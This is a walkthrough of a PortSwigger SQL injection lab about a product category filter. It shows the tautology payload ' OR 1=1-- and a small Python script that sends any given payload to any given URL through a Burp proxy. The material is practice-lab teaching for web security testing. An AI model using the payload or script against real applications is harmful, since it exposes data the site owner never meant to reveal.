---
title: "Portswigger SQL Injection Lab 1"
description: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
date: 2025-05-31T09:57:00+05:45
cheatsheet_categories: ["Labs"]
cheatsheet_tags: ["error based sql injection", "pentesting", "sql injection", "portswigger"]
folder: "sqlinjection"
draft: false
weight: 1
---

> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
  `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
   To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

---

There is a "*Refine your search*" section and when the search parameters are clicked, the URL changes as following:
`https://0a9d001d0490fb0181528e4d00d10082.web-security-academy.net/filter?category=Accessories`

### Finding SQLI
Trying SQL characters, here `'` to check if the server is vulnerable to SQLI
Changing the URL to `https://0a9d001d0490fb0181528e4d00d10082.web-security-academy.net/filter?category='` gives -> **Internal Server Error** -> SQLi existence confirmed

### Attacking
Using the SQLi `' OR 1=1--` results in the following query:
```sql
SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
```
Since 1=1 always results to true, this will make the database display all the products

 **Used payload ->** `' OR 1=1--` 

---

# Pythonizing for Automating 
```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Dictionary for proxies like burp
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} 

def url_exploit(url,payload):
    uri = "/filter?category="
    req=requests.get(url + uri +payload, verify=False, proxies = proxies)
    if "Safety First" in req.text:
        return True
    else:
        return False

if __name__== "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <url> <payload>")
        sys.exit(-1)
           
    if url_exploit(url, payload):
        print("Successful")
    else:
        print("Unsuccessful")     
```